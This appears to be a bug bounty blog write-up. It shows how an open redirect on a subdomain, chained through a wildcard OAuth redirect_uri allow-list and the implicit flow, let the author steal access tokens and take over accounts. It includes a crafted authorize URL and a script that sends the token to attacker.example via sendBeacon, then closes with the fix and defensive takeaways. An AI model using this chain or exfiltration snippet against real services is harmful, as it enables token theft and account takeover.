---
title: 'Open redirect → full account takeover via OAuth token leak'
description: 'A "won''t fix" open redirect on a marketing subdomain turned into one-click account takeover once it was chained through the OAuth implicit flow.'
pubDate: 2026-07-28
heroImage: '/thumbnails/oauth.png'
tags: ['OAuth', 'ATO', 'High']
---

Everyone ignores open redirects. Programs close them as informational, researchers stop
reporting them. That's exactly why they're still worth chasing — an open redirect is a
gadget, not a bug. On its own it's worth nothing. Pointed at an OAuth flow, it's an
account takeover.

Here's how a `redirect_uri` that "only allowed the app's own domain" gave up an
access token for any user who clicked one link.

## The gadget

The program ran SSO through their own OAuth 2.0 server. The authorize endpoint looked
locked down — `redirect_uri` had to be on `*.acme.example`:

```http
GET /oauth/authorize?client_id=web&response_type=token
    &redirect_uri=https://app.acme.example/callback
    &scope=profile+email HTTP/1.1
Host: sso.acme.example
```

`response_type=token` is the tell. This is the **implicit flow** — the access token comes
back in the URL fragment, straight to the browser. If I can bend the redirect to a page I
control, the token is mine.

The allow-list check was a prefix match on the host. So `app.acme.example` passed. But so
did a *different* host that started the same way — and, more importantly, the marketing
site had an old open redirect:

```
https://go.acme.example/r?u=https://attacker.example/grab
```

`go.acme.example` was on the allow-list (it's `*.acme.example`). The token would land on
`go.acme.example`, which would then 302 it onward — fragment and all.

## The chain

Browsers preserve the URL fragment across a 302 redirect when the target has no fragment
of its own. That's the whole trick.

1. Victim clicks a link to `sso.acme.example/oauth/authorize` with
   `redirect_uri=https://go.acme.example/r?u=https://attacker.example/grab`.
2. They're already logged in, so the server issues a token and redirects to
   `https://go.acme.example/r?u=...#access_token=ey...`.
3. `go.acme.example` open-redirects to `https://attacker.example/grab`, and the browser
   **carries the `#access_token` fragment along**.
4. My page reads `location.hash` and pockets the token.

```html
<script>
  const token = new URLSearchParams(location.hash.slice(1)).get('access_token');
  navigator.sendBeacon('https://attacker.example/collect', token);
</script>
```

With that token I could call the API as the victim:

```http
GET /api/v2/me HTTP/1.1
Host: api.acme.example
Authorization: Bearer ey...

200 OK
{ "id": 88213, "email": "victim@…", "role": "user", "can_reset_password": true }
```

Full profile read, email change, session enumeration — everything the `profile email`
scope allowed, which was enough to pivot to a password reset and lock the real user out.

## Impact

One click. No interaction beyond following a link to a legitimate `acme.example` domain.
Any authenticated user could be taken over. Reported as **High** (borderline Critical
given the reset pivot); fixed by moving to the authorization-code flow with PKCE and exact
`redirect_uri` matching.

## Takeaways

- Treat open redirects as **chain fuel**, not findings. Log them, don't discard them.
- Any `response_type=token` is a red flag — the implicit flow hands secrets to the browser.
- Host allow-lists that prefix-match or trust `*.domain` are one forgotten redirect away
  from token theft. Enumerate *every* subdomain on the allow-list for redirect gadgets.
